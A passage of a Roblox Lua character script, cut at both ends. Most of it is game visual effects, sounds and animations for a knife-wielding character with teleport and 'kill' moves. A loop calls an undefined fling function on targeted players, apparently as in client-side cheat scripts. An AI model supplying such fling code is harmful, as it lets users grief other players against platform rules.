	local AngleAcc=angles(random(-30,30,10),random(-30,30,10),random(-30,30,10),true)
	local Parts,SegmentLength=Parts or random(5,20),SegmentLength or random(1,2,100)
	local CF=(CF or cf())*cf(0,SegmentLength/2,0)
	local Mod=ins("Model",workspace.Terrain)
	if MoreTent then
		local P=ins("Part",{Massless=true,Anchored=true,CanCollide=false,Locked=true,CastShadow=false,Size=v3(Parts/5,0,Parts/5),Transparency=0,Material="Neon",Color=bc("Crimson").Color,CFrame=CF*cf(0,-SegmentLength/2,0),Parent=Mod})
		local So=Sound(1843492223,5*(Parts/20),random(.8,1.2,100),P,150*(Parts/20),5*(Parts/20))
		local Light=ins("PointLight",{Brightness=1.65,Range=20,Color=bc("Crimson").Color,Parent=P})
		ins("SpecialMesh",{MeshType="Sphere",Parent=P})
		Instance.Remove(P,Parts/15)
		Tween(P,{Color=bc("Really black").Color,Transparency=1},{Parts/15,Enum.EasingStyle.Sine,Enum.EasingDirection.In,0,false,0})
		Tween(Light,{Color=bc("Really black").Color},{Parts/15,Enum.EasingStyle.Sine,Enum.EasingDirection.In,0,false,0})
	end
	coroutine.wrap(function()
		local TotalTime=0
		for i=Parts,1,-1 do
			local Time=i/10
			TotalTime=TotalTime+Time
			local P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,CastShadow=false,Material="Neon",Color=bc("Crimson").Color,Size=v3(i/10,SegmentLength,i/10),CFrame=CF,Parent=Mod})
			local Mesh=ins("CylinderMesh",P)
			Instance.Remove(P,Time*2)
			Tween(Mesh,{Scale=v3(0,1,0)},{Time,Enum.EasingStyle.Sine,Enum.EasingDirection.In,0,false,0})
			Tween(P,{Color=bc("Really black").Color,Orientation=P.Orientation+v3(AngleAcc:ToOrientation())*random(-5,5,100)},{Time,Enum.EasingStyle.Sine,Enum.EasingDirection.In,0,false,0})
			local FallPos=P.Position-v3(0,Time*random(-2,10,100),0)
			local AngleAcc1=AngleAcc
			local Hit1,Pos1,NID1=Raycast(P.Position,CF.UpVector,{char,workspace.Terrain},SegmentLength*3)
			local Hit2,Pos2,NID2=Raycast(P.Position,FallPos-P.Position,{char,workspace.Terrain},(P.Position-FallPos).Magnitude)
			if Hit1 then AngleAcc1=AngleAcc1*angles(NID1.X*90,NID1.Y*90,NID1.Z*90,true) end
			if Hit2 then FallPos=Pos2 end
			Tween(P,{Position=FallPos},{Time*1.75,Enum.EasingStyle.Sine,Enum.EasingDirection.In,0,false,0})
			local VAng=v3(AngleAcc1:ToOrientation())*(180/pi)
			if (math.cos(i/10))<-.2 and (math.cos(i/10))>.2 then
				VAng=VAng*(math.cos(i/5)-math.sin(math.pow(i%25)/15))*5
			end
			local CF1=CF
			if random(0,1,10)==1 and MoreTent then
				Eff(CF1,random(5,math.clamp(i,5,1000)))
			end
			CF=CF*cf(0,SegmentLength/2,0)*angles(VAng.X,VAng.Y,VAng.Z,true)*cf(0,SegmentLength/2,0)
			Swait()
		end
		Instance.Remove(Mod,TotalTime*2)
	end)()
end
function Refit()
	if RefitDeb then return end
	RefitDeb=true
	
	local OldChar=char

	for i,v in pairs(char:GetDescendants()) do
		if (v.Name=="Animate" and v:IsA("LocalScript")) or v:IsA("Animator") or v:IsA("ForceField") then
			if v:IsA("LocalScript") then v.Disabled=true end
			if not v:IsA("ForceField") then Instance.Remove(v) else if v.Visible then Instance.Remove(v) end end
		end
	end
	CreateTheme()
	
	Smiles=Models.Smiles:Clone()
	Smiles.Parent=t
	
	
	
	Effects=ins("Model",{Name="Effects",Parent=Char})
	if KnifeToggled then Knife=KnifeC:Clone() Knife.Parent=t KnifeW=ins("Motor6D",{Part0=ra,Part1=Knife,C0=KnC0*angles(0,180,0,true)*angles(-20,0,0,true),C1=KnC1,Parent=t}) end
	Blood()
	for i,v in pairs(char:GetChildren()) do
		if v:IsA("BasePart") then
			Models.Aura:Clone().Parent=v
			Models.Aura2:Clone().Parent=v
		end
	end
	wait(.1)
	RefitDeb=false
end
local function LeaveKnifeTrail(Pos1,Pos2,Parent)
	if not Parent then return end
	KTPosDelay=1
	local P=ins("Part",{Locked=true,Massless=true,CanCollide=false,Anchored=false,Size=v3(.1,.1,(Pos1-Pos2).Magnitude),Color=bc("Really red").Color,Material="Neon",CFrame=cf(Pos1,Pos2)*cf(0,0,-(Pos1-Pos2).Magnitude/2),Parent=Parent})
	local M=ins("BlockMesh",P)
	local CF_=P.CFrame
	local WE=ins("Motor6D",{Part0=Parent,Part1=P,C0=Parent.CFrame:ToObjectSpace(CF_),Parent=BLOODPARENT})
	P.Parent=WE
	local SO=Sound(1837829368,.5,random(.9,1.1,100),P,50,2.5)
	Instance.Remove(P,SO.TimeLength/2.25)
	Tween(M,{Scale=v3(0,0,1)},{SO.TimeLength/2.25,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,0,false,0})
end
local function Blink()
	--[[coroutine.wrap(function()
		coroutine.wrap(function()
			if random(0,1,10)==1 then
				Laugh()
			end
		end)()
		for i,v in pairs(char:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency==0 then
				local Time=random(.05,.15,100)
				coroutine.wrap(function()
					if v:FindFirstChild("Blank") then
						local Drip=v.Blank:FindFirstChild("Drip")
						v.Blank.Transparency=random(0,1,100)
						v.Transparency=1
						if Drip then Drip.Enabled=true end
						wait(Time)
						v.Blank.Transparency=1
						v.Transparency=0
						if Drip then Drip.Enabled=false end
					end
				end)()
				game:GetService("RunService").Heartbeat:Wait()
			end
		end
	end)()]]
end
local function NewBeamRing(CF,Size,Width,Ang,Trans,Col,SizeT,WidthT,AngT,TransT,ColT,Time,Style,Dir)
	assert(CF,"no cframe given")
	Size,Width,Ang,Trans,Col,SizeT,WidthT,AngT,TransT,ColT,Time,Style,Dir=Size or 5,Width or 1,Ang or 90,Trans or 0,Col or c3(1,1,1),SizeT or 10,WidthT or 5,AngT or 0,TransT or 1,ColT or c3(1,1,1),Time or 1.5,Style or Enum.EasingStyle.Back,Dir or Enum.EasingDirection.Out
	local P=Models.NewBeamRing:Clone()
	local TV,CV=ins("NumberValue",{Value=Trans}),ins("Color3Value",{Value=Col})
	local A1,A2,A3,A4=P.A1,P.A2,P.A3,P.A4
	local B1,B2,B3,B4=P.B1,P.B2,P.B3,P.B4
	P.CFrame=CF
	A1.Position,A2.Position,A3.Position,A4.Position=v3(0,0,Size/2),v3(0,0,-Size/2),v3(Size/2,0,0),v3(-Size/2,0,0)
	A1.Orientation,A2.Orientation,A3.Orientation,A4.Orientation=v3(Ang,0,0),v3(Ang,-180,0),v3(Ang,90,0),v3(Ang,-90,0)
	B1.Transparency,B2.Transparency,B3.Transparency,B4.Transparency=ns(Trans),ns(Trans),ns(Trans),ns(Trans)
	B1.Color,B2.Color,B3.Color,B4.Color=cs(Col),cs(Col),cs(Col),cs(Col)  --  v lazy lol
	B1.Width0,B1.Width1,B2.Width0,B2.Width1,B3.Width0,B3.Width1,B4.Width0,B4.Width1=Width*2,Width*2,Width*2,Width*2,Width*2,Width*2,Width*2,Width*2
	B1.CurveSize0,B1.CurveSize1,B2.CurveSize0,B2.CurveSize1,B3.CurveSize0,B3.CurveSize1,B4.CurveSize0,B4.CurveSize1=(Size/2)*.60000000,(Size/2)*.60000000,-(Size/2)*.60000000,-(Size/2)*.60000000,(Size/2)*.60000000,(Size/2)*.60000000,-(Size/2)*.60000000,-(Size/2)*.60000000
	P.Parent=Effects
	Tween(A1,{Position=v3(0,0,SizeT/2),Orientation=v3(AngT,0,0)},{Time,Style,Dir,0,false,0}) Tween(A2,{Position=v3(0,0,-SizeT/2),Orientation=v3(AngT,180,0)},{Time,Style,Dir,0,false,0}) Tween(A3,{Position=v3(SizeT/2,0,0),Orientation=v3(AngT,90,0)},{Time,Style,Dir,0,false,0}) Tween(A4,{Position=v3(-SizeT/2,0,0),Orientation=v3(AngT,-90,0)},{Time,Style,Dir,0,false,0})
	Tween(TV,{Value=TransT},{Time,Style,Dir,0,false,0}) Tween(CV,{Value=ColT},{Time,Style,Dir,0,false,0})
	Tween(B1,{Width0=WidthT*2,Width1=WidthT*2,CurveSize0=(SizeT/2)*.60000000,CurveSize1=(SizeT/2)*.60000000},{Time,Style,Dir,0,false,0}) Tween(B2,{Width0=WidthT*2,Width1=WidthT*2,CurveSize0=-(SizeT/2)*.60000000,CurveSize1=-(SizeT/2)*.60000000},{Time,Style,Dir,0,false,0}) Tween(B3,{Width0=WidthT*2,Width1=WidthT*2,CurveSize0=(SizeT/2)*.60000000,CurveSize1=(SizeT/2)*.60000000},{Time,Style,Dir,0,false,0}) Tween(B4,{Width0=WidthT*2,Width1=WidthT*2,CurveSize0=-(SizeT/2)*.60000000,CurveSize1=-(SizeT/2)*.60000000},{Time,Style,Dir,0,false,0})
	TV.Changed:Connect(function()
		B1.Transparency,B2.Transparency,B3.Transparency,B4.Transparency=ns(TV.Value),ns(TV.Value),ns(TV.Value),ns(TV.Value)
		B1.Color,B2.Color,B3.Color,B4.Color=cs(CV.Value),cs(CV.Value),cs(CV.Value),cs(CV.Value)
	end)
	if Time>0 then Instance.Remove(P,Time+.25) end
	return P
end
function PerformCombo()
	if not Knife or Using then return end
	if Combos[Combo] then ComboPool=ComboPool+100 Combos[Combo]() end
	Combo=Combo+1
	if Combo>#Combos then Combo=1 end
end
--// Moves
function Warp()
	if not Mouse.Target then return end
	for i,v in pairs({h,t,ra,la,rl,ll}) do
		local P,Time=nil,random(.35,1.25,100)
		if v~=h then
			P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,Size=v.Size,CFrame=v.CFrame,Color=bc("Crimson").Color,Material="Neon",Parent=Effects})
		else
			P=FakeHead:Clone()
			P.CFrame,P.Color,P.Material,P.Parent=v.CFrame,bc("Crimson").Color,"Neon",Effects
		end
		Instance.Remove(P,Time)
		Tween(P,{Size=P.Size*random(1.1,1.5,100),Transparency=1,Position=P.Position+v3(0,random(.25,2,100),0),Orientation=P.Orientation+v3(random(-25,25,10),random(-25,25,10),random(-25,25,10))},{Time,Enum.EasingStyle.Circular,Enum.EasingDirection.Out,0,false,0})
	end
	local OldCF=hrp.CFrame
	local Corpse=CharClone:Clone()
	Corpse.Parent=workspace.Terrain
	for i,v in pairs(Corpse:GetChildren()) do if v:IsA("ForceField") then Instance.Remove(v) end end
	Corpse.HumanoidRootPart.CFrame=OldCF
	
	local SP=ins("Part",{Anchored=true,CanCollide=false,Size=v3(0,0,0),Transparency=1,CFrame=OldCF,Parent=Effects})
	Sound(1843492223,3,random(.8,1.2,100),SP,150,10)
	Sound(649642524,2,random(.8,1.2,100),SP,150,10)
	--Sound(785364394,random(2.5,5,10),random(.9,1.1,100),t,100,5)
	Instance.Remove(SP,4)
	coroutine.wrap(function()
		wait(1/30)
		for i,v in pairs(Corpse:GetChildren()) do
			if v:IsA("BasePart") then
				if char:FindFirstChild(v.Name) then
					local P,Time=nil,random(.35,1.25,100)
					if v.Name~="Head" then
						P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,Size=v.Size,CFrame=v.CFrame,Color=bc("Crimson").Color,Material="Neon",Parent=Effects})
					else
						P=FakeHead:Clone()
						P.CFrame,P.Color,P.Material,P.Parent=v.CFrame,bc("Crimson").Color,"Neon",Effects
					end
					Instance.Remove(P,Time)
					Tween(P,{Transparency=1,CFrame=char:FindFirstChild(v.Name).CFrame},{Time,Enum.EasingStyle.Circular,Enum.EasingDirection.Out,0,false,0})
				end
			end
		end
		wait(random(.75,1.5,100))
		for i,v in pairs(Corpse:GetChildren()) do
			if v:IsA("BasePart") then
				local P,Time=nil,random(.35,1.25,100)
				if v.Name~="Head" then
					P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,Size=v.Size,CFrame=v.CFrame,Color=bc("Crimson").Color,Material="Neon",Parent=Effects})
				else
					P=FakeHead:Clone()
					P.CFrame,P.Color,P.Material,P.Parent=v.CFrame,bc("Crimson").Color,"Neon",Effects
				end
				Instance.Remove(P,Time)
				Tween(P,{Size=P.Size*random(1.1,1.5,100),Transparency=1,Position=P.Position+v3(0,random(.25,2,100),0),Orientation=P.Orientation+v3(random(-25,25,10),random(-25,25,10),random(-25,25,10))},{Time,Enum.EasingStyle.Circular,Enum.EasingDirection.Out,0,false,0})
				if char:FindFirstChild(v.Name) then
					local P,Time=nil,random(.35,1.25,100)
					if v.Name~="Head" then
						P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,Size=v.Size,CFrame=v.CFrame,Color=bc("Crimson").Color,Material="Neon",Parent=Effects})
					else
						P=FakeHead:Clone()
						P.CFrame,P.Color,P.Material,P.Parent=v.CFrame,bc("Crimson").Color,"Neon",Effects
					end
					local SP=ins("Part",{Anchored=true,CanCollide=false,Size=v3(0,0,0),Transparency=1,CFrame=cf(v.Position),Parent=Effects})
					local BLD=BloodSplash:Clone()
					BLD.Parent=SP BLD:Emit(30)
					Sound(({264486467,356551938})[random(1,2)],1,random(.9,1.1),SP,100,5)
					Instance.Remove(SP,5)
					for i=1,random(2,5) do
						--Blood.new(cf(v.Position)*cf(random(-1,1,100),random(0,1,100),random(-1,1,100)),v3(random(-40,40,10),random(-40,40,10),random(-40,40,10)),random(.75,5,100))
					end
					Instance.Remove(P,Time)
					Tween(P,{Transparency=1,CFrame=char:FindFirstChild(v.Name).CFrame},{Time,Enum.EasingStyle.Circular,Enum.EasingDirection.Out,0,false,0})
				end
			end
		end
		Instance.Remove(Corpse)
	end)()
	local CF1=cf(OldCF.Position,Mouse.Hit.Position+v3(0,3,0))*cf(0,0,-100000)
	hrp.CFrame=cf(Mouse.Hit.Position+v3(0,3,0),v3(CF1.X,(Mouse.Hit.Position+v3(0,3,0)).Y,CF1.Z))
	for i,v in pairs({h,t,ra,la,rl,ll}) do
		local P,Time=nil,random(.35,1.25,100)
		if v~=h then
			P=ins("Part",{Locked=true,Massless=true,Anchored=true,CanCollide=false,Size=v.Size,CFrame=v.CFrame,Color=bc("Crimson").Color,Material="Neon",Parent=Effects})
		else
			P=FakeHead:Clone()
			P.CFrame,P.Color,P.Material=v.CFrame,bc("Crimson").Color,"Neon"
		end
		Instance.Remove(P,Time)
		Tween(P,{Size=P.Size*random(1.1,1.5,100),Transparency=1,Position=P.Position+v3(0,random(.25,2,100),0),Orientation=P.Orientation+v3(random(-25,25,10),random(-25,25,10),random(-25,25,10))},{Time,Enum.EasingStyle.Circular,Enum.EasingDirection.Out,0,false,0})
	end
end
function TpKill()
	if not Mouse.Target or Using then return end
	Using=true
	local Tar=Mouse.Target
	local Hum_=(Tar.Parent or Tar.Parent.Parent or Tar.Parent.Parent.Parent):FindFirstChildOfClass("Humanoid")
	if Hum_ and Hum_.Health>0 then
		if random(0,1,2)==1 then Laugh() end
		local T_=Hum_.Parent:FindFirstChild("Torso") or Hum_.Parent:FindFirstChild("UpperTorso")
		if not T_ then return end
		if KnifeToggled then
			
		else
			local H_=Hum_.Parent:FindFirstChild("Head")
			local Neck=T_.Name=="Torso" and T_:FindFirstChild("Neck") or T_.Name=="UpperTorso" and H_:FindFirstChild("Neck")
			if H_ then
				T_.Anchored,HRP.Anchored=true,true
				HRP.CFrame=T_.CFrame
				Blink()
				Neck.C0,Neck.C1=cf(0,T_.Size.Y/2,0),cf(0,-H_.Size.Y/2,0)
				PlayAnim(Anims.TPSnap,{
					[1]=function()
						Tween(T_,{CFrame=HRP.CFrame*cf(-.1,.075,.15)*angles(3.5,2.5,-5,true)},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0})
						Tween(Neck,{C0=cf(0,T_.Size.Y/2,0)*angles(5,-110,0,true),C1=cf(0,-H_.Size.Y/2,0)},{.2,Enum.EasingStyle.Back,Enum.EasingDirection.InOut,0,false,0})
						Sound(3848986758,.65,random(.9,1.1,100),H_,50,5)
					end,
					[2]=function()
						T_.CFrame=T_.CFrame*cf(0,0,-1)
						MagDamage(H_.CFrame*cf(0,0,.4).Position,v3(.1,.1,.1),false,10,false,true)
					end
				})
				T_.Anchored,HRP.Anchored,H_.Anchored=false,false,false
				coroutine.wrap(function()
					wait(.125)
					T_.Anchored=false
				end)()
			else
				local Size=random(25,100)
				Eff(cf(T_.Position)*cf(0,-3,0),Size,true,5)
				MagDamage(cf(T_.Position)*cf(0,-1,0).Position,v3(1,1,1)*Size/10,false,random(1000,2500))
			end
		end
	end
	Using=false
end
function CursedGround()
	if Using then return end
	Using=true
	local Hit,Pos,NID=Raycast(t.Position,v3(0,-1,0),{Char,BLOODPARENT},4,true)
	if Hit then
		WS,JP=0,0
		PlayAnim(Anims.CursedGround)
		WS,JP=6,50
		local Time,IdleTime=random(.5,1,100),random(5,10)
		local CF=cf(Pos,Pos-NID)*angles(90,0,0,true)*angles(0,random(-180,180,10),0,true)
		local P=ins("Part",{Anchored=true,CanCollide=false,Transparency=1,Size=v3(),CFrame=CF*cf(0,.1,0)*angles(0,random(-180,180,10),0,true),Parent=BLOODPARENT})
		local M=ins("BlockMesh",{Scale=v3(55,0,55)*random(15,30,10),Parent=P})
		local Im=ins("Decal",{Texture="rbxassetid://950330730",Color3=c3(50,0,0),Transparency=1,Face="Top",Parent=P})
		local L=ins("PointLight",{Shadows=true,Color=c3(1,0,0),Range=0,Brightness=1.15,Parent=P})
		Sound(1842431666,2.5,random(.9,1.1,100),P,250,15)
		Sound(1842442774,3,random(.9,1.1,100),P,250,15)
		Sound(416200578,2,random(.9,1.1,100),P,150,7.5)
		Tween(P,{CFrame=CF},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Tween(M,{Scale=v3(40,0,40)*20},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Tween(Im,{Transparency=0},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Tween(L,{Range=50},{Time})
		local PP=ins("Part",{Anchored=true,CanCollide=false,Size=v3(30,0,30),Transparency=1,CFrame=P.CFrame,Parent=Effects})
		local PE1,PE2=Models.CGVap:Clone(),Models.CGParticles:Clone()
		PE1.Parent,PE2.Parent=PP,PP
		coroutine.wrap(function()
			for i=1,random(2,5) do
				NewBeamRing(CF*angles(0,random(-180,180,10),0,true),M.Scale.X/15,3,90,0,bc("Crimson").Color,M.Scale.X/100,65,15,1,bc("Crimson").Color,Time*random(1.25,1.5,100))
				wait(random(.05,.1,100))
			end
		end)()
		local BP1=NewBeamRing(P.CFrame,40/1.3513513513514,15,20,0,bc("Crimson").Color,40/1.3513513513514,15,20,0,bc("Crimson").Color,0)
		local BP2=NewBeamRing(P.CFrame,40,7.5,20,0,bc("Crimson").Color,40,7.5,20,0,bc("Crimson").Color,0)
		local PEff=ins("Part",{Anchored=true,CanCollide=false,Size=v3(),Transparency=1,CFrame=CF*angles(0,random(-180,180,10),0,true),Parent=BLOODPARENT})
		local PM=ins("BlockMesh",{Scale=v3(45,0,45)*20,Parent=PEff})
		local PIm=ins("Decal",{Texture="rbxassetid://750161292",Face="Top",Color3=c3(50,0,0),Parent=PEff})
		Tween(PM,{Scale=v3(90,0,90)*20},{IdleTime+Time,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0})
		Tween(PIm,{Transparency=1},{Time,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,IdleTime})
		for i=1,IdleTime,.5 do
			Sound(1177785010,2,random(.5,.8,100),P,150,7.5)
			Sound(1192402877,1.75,random(1.25,2,100),P,100,5)
			NewBeamRing(CF*angles(0,random(-180,180,10),0,true),M.Scale.X/100,15,0,0,bc("Crimson").Color,M.Scale.X/12,5,80,1,bc("Crimson").Color,2)
			MagDamage(CF.Position+v3(0,30,0),v3(50,60,50),false,15,true)
			wait(.5)	
		end
		Sound(2785493,4.5,random(.7,.9,100),P,200,7.5)
		Tween(L,{Range=0},{Time})
		PE1.Enabled,PE2.Enabled=false,false
		BP1:Destroy() BP2:Destroy()
		NewBeamRing(P.CFrame,40/1.3513513513514,15,20,0,bc("Crimson").Color,60/1.3513513513514,5,80,1,bc("Crimson").Color,Time)
		NewBeamRing(P.CFrame,40,7.5,20,0,bc("Crimson").Color,60,2.5,90,1,bc("Crimson").Color,Time)
		Tween(P,{CFrame=CF*angles(0,random(-180,180,10),0,true)},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Tween(M,{Scale=v3(0,0,0)},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Tween(Im,{Transparency=1},{Time,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,false,0})
		Instance.Remove({P,PP,PEff},Time*8)
		if random(0,1,2)==1 then Laugh() end
	end
	Using=false
end
Combos={
	function()
		Using=true
		PlayAnim(Anims.Swing1,{[1]=function() KnifeTrail=true end,[3]=function() KnifeTrail=false end})
		Using=false
	end
}
--// Function setup
CreateTheme()
Refit()
--// Connections

local cnnnnn = game.Players.LocalPlayer.Character
local function gp(parent, name, className)
	local ret = nil
	if parent then
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
			end
		end
	end
	return ret
end

local attnnn = gp(gp(gp(cnnnnn, "White SS", "Accessory"), "Handle", "BasePart"), "att1_Handle", "Attachment")
local handlennn = gp(gp(cnnnnn, "White SS", "Accessory"), "Handle", "BasePart")


UIS.InputBegan:Connect(function(IO,L)
	if L then return end
	if IO.UserInputType==Enum.UserInputType.Keyboard then
		if IO.KeyCode==Enum.KeyCode.M then Muted=not Muted 
		elseif IO.KeyCode==Enum.KeyCode.Q then KnifeToggled=not KnifeToggled
			if KnifeToggled and not (Knife and KnifeW) then if KnifeDeb then return end Sound(649642524,1.25,random(.65,.75,100),t,100,2.5) Knife=KnifeC:Clone() Knife.Parent=t KnifeW=ins("Motor6D",{Part0=ra,Part1=Knife,C0=KnC0*angles(0,180,0,true)*angles(-20,0,0,true),C1=KnC1,Parent=t}) attnnn.Parent=Knife attnnn.Orientation = Vector3.new(45, -90, 0) Knife.Transparency=1 Knife.CreateKnifeFX.Enabled=true coroutine.wrap(function() KnifeDeb=true Tween(Knife,{Transparency=.25},{1,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}) wait(.75) Knife.CreateKnifeFX.Enabled=false KnifeDeb=false end)()
			else if KnifeDeb or not Knife then return end Knife.RemoveKnifeFX.Enabled=true Sound(649642524,1.25,random(.65,.75,100),t,100,2.5) coroutine.wrap(function() KnifeDeb=true Tween(Knife,{Transparency=1},{1,Enum.EasingStyle.Sine,Enum.EasingDirection.Out,0,false,0}) wait(.5) Knife.RemoveKnifeFX.Enabled=false attnnn.Parent=handlennn attnnn.Orientation = Vector3.new() wait(1) Instance.Remove({Knife,KnifeW}) Knife,KnifeW=nil,nil KnifeDeb=false end)() end
		elseif IO.KeyCode==Enum.KeyCode.X then Warp()
		elseif IO.KeyCode==Enum.KeyCode.R then TpKill()
		elseif IO.KeyCode==Enum.KeyCode.N then local OldNum=ThemeNum repeat ThemeNum=random(1,#Themes) until ThemeNum~=OldNum Theme.TimePosition=0 TimePos=0
		elseif IO.KeyCode==Enum.KeyCode.E then if not KnifeToggled then CursedGround() end
		elseif IO.KeyCode==Enum.KeyCode.T then Laugh() end
	elseif IO.UserInputType==Enum.UserInputType.MouseButton1 then PerformCombo() end
end)

spawn(function()
	while game:GetService("RunService").Heartbeat:Wait() do
		if KnifeToggled == false then
			

		elseif KnifeToggled == true then


			if targetnnn ~= nil then
				GlobalFunctions.fling(targetnnn)
				wait(0.1)
				targetnnn = nil
			end
		end
	end
end)

while true do
	Swait()
	Sine=Sine+Change
	local Direction=hum.MoveDirection
	if Direction.Magnitude==0 then Direction=t.Velocity/7.5 end
	local MoveZ=clamp((Direction*t.CFrame.LookVector).X+(Direction*t.CFrame.LookVector).Z,-1,1)
	local MoveX=clamp((Direction*t.CFrame.RightVector).X+(Direction*t.CFrame.RightVector).Z,-1,1)
	local Moving=(hrp.Velocity*v3(1,0,1)).Magnitude>.01
	local VerY=hrp.Velocity.Y
	local StandR,RPos,RNID=Raycast(hrp.CFrame*cf(hrp.Size.X/4,-hrp.Size.Y/2,0).Position,-hrp.CFrame.UpVector,{char},3,false)
	local StandL,LPos,LNID=Raycast(hrp.CFrame*cf(-hrp.Size.X/4,-hrp.Size.Y/2,0).Position,-hrp.CFrame.UpVector,{char},3,false)
	local Stand=StandR or StandL
	ComboPool=clamp(ComboPool-1,0,45)
	DrippingLeft=clamp(DrippingLeft,0,50)
	if ComboPool==0 then Combo=1 end
	local KTHit,KTRPos,KTNID
	if Knife then KTHit,KTRPos,KTNID=Raycast(Knife.CFrame*cf(-1,0,0).Position,Knife.CFrame.RightVector,{char,BLOODPARENT},Knife.Size.X,true) if not KTHit then KTHit,KTRPos,KTNID=Raycast(Knife.CFrame*cf(0,.65,0).Position,-Knife.CFrame.UpVector,{char,BLOODPARENT},Knife.Size.X,true) end  end
	hum.WalkSpeed,hum.JumpPower,Hum.PlatformStand,Hum.Sit=(LockWS and WS or hum.WalkSpeed),(LockJP and JP or hum.JumpPower),false,false
	if Theme.TimePosition>=Theme.TimeLength-1 and #Themes>1 then local OldNum=ThemeNum repeat ThemeNum=random(1,#Themes) until ThemeNum~=OldNum Theme.TimePosition=0 TimePos=0 end
	if not Theme or Theme.Parent~=t then CreateTheme() end
	TimePos=Theme.TimePosition
	Theme.PlaybackSpeed,Theme.Volume,Theme.SoundId,Theme.EmitterSize,Theme.RollOffMode=.75,Muted and 0 or Themes[ThemeNum][2],"rbxassetid://"..Themes[ThemeNum][1],250,Enum.RollOffMode.Linear
	Theme:Resume()
	if hrp and Stand then Pos=hrp.CFrame end
	if Player.Character~=char or not char.Parent then Refit() end
	if random(0,1,70)==1 then nec.C0=nec.C0*angles(random(-5,5,10),random(-5,5,10),random(-5,5,10),true) end
	if random(0,1,85)==1 then
		local CFA=v3(random(-5,5,10),random(-5,5,10),random(-5,5,10))
		rutj.C0=rutj.C0*cf(CFA/50)*angles(CFA.X,CFA.Y,CFA.Z,true)
		rs.C0=rs.C0*angles(-CFA.X,-CFA.Y,-CFA.Z,true)
		ls.C0=ls.C0*angles(-CFA.X,-CFA.Y,-CFA.Z,true)
		rh.C0=rh.C0*cf(-CFA/50)*angles(-CFA.X*1.5,-CFA.Y,-CFA.Z*1.5,true)
		lh.C0=lh.C0*cf(-CFA/50)*angles(-CFA.X*1.5,-CFA.Y,-CFA.Z*1.5,true)
	end
	if tick()-LastClickTick>=ClickTime then LastClickTick,ClickTime=tick(),random(1,7.5,10) local G=Models.Geig:Clone() G.TimePosition=random(0,10,100) G.Parent=t G:Resume() local Time=random(.5,4,10) Tween(G,{Volume=0},{Time,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,Time-.25,false,0}) Instance.Remove(G,Time) end
	if tick()-LastBlinkTick>=BlinkTime then LastBlinkTick,BlinkTime=tick(),random(5,15,10) Blink() end
	if random(0,1,25)==1 and DrippingLeft>0 and Knife then DrippingLeft=DrippingLeft-1 --Blood.new(Knife.CFrame*cf(random(-.25,1,100),random(-.25,.25,100),0),v3(0,0,0),random(.15,.4,100)) 
		
	end
	if random(0,1,175)==1 and not Using then
		coroutine.wrap(function()
			local Num=not Moving and random(1,2) or random(1,3)
			if Num==1 then
				Blink()
				for i=1,random(1,5) do
					CSFuncs.SlightFO(random(.03,.05,100))
					local Ang=angles(random(-30,30,10),random(-30,30,10),random(-30,30,10),true)
					local RotX,RotY,RotZ=Ang:ToOrientation()
					nec.C0=necC0*cf(0,0,0)*angles(-25,0,0,true)
					rutj.C0=rutjC0*cf(0,-1,0)*Ang*cf(0,1,0)*cf(0,-abs(RotZ/25),0)*cf(0,-.65,-.25)*angles(-25,0,0,true)
					rs.C0=rsC0*cf(-.3,0,-.1)*angles(185,15,0,true)*angles(0,0,-35,true)
					ls.C0=lsC0*cf(.3,0,-.1)*angles(185,-15,0,true)*angles(0,0,35,true)
					rh.C0=rhC0*cf(0,.65,-.1)*Ang:Inverse()*cf(0,-RotZ/25,0)*angles(25,-5,1.5,true)
					lh.C0=lhC0*cf(0,.65,-.1)*Ang:Inverse()*cf(0,RotZ/25,0)*angles(30,5,-1.5,true)
					Sound(5281599580,.5,random(1.1,1.7,100),t,100,10)
					wait(random(.03,.05,1000))
				end
			elseif Num==2 then
				nec.C0=necC0*cf(0,0,0)*angles(-45,0,0,true)
				rutj.C0=rutjC0*cf(0,-.25,.1)*angles(-15,0,0,true)
				rs.C0=rsC0*cf(-.35,-.2,-.1)*angles(15,10,-2.5,true)
				ls.C0=lsC0*cf(.35,-.2,-.1)*angles(15,-10,2.5,true)
				rh.C0=rhC0*cf(0,.25,-.2)*angles(15,-5,1.5,true)
				lh.C0=lhC0*cf(0,.25,-.2)*angles(15,5,-1.5,true)
			elseif Num==3 then
				Blink()
				for i=1,random(1,10) do
					nec.C0=necC0*cf(0,0,0)*angles(10,0,random(-30,30),true)
					rutj.C0=rutj.C0:Lerp(rutjC0*cf(random(-.1,.1,100),random(-.1,.1,100),random(-.1,.1,100))*angles(random(-1,1,10),random(-1,1,10),random(-1,1,10)),.1)
					rs.C0=rsC0*cf(-.25,0,-.35)*angles(95,10,-2.5,true)
					ls.C0=lsC0*cf(.35,-.2,-.1)*angles(-15,10,-2.5,true)
					Swait()
				end
			end
			wait(1/30)
			local IdleVal=30
			local CFA=v3(random(-5,5,10),random(-5,5,10),random(-5,5,10))
			nec.C0=necC0*cf(0,0,0)*angles(sin(Sine/IdleVal)*2,CosSin(Sine/(IdleVal*4))*10,0,true)*cf(0,0,0)*angles(-10,0,10,true)
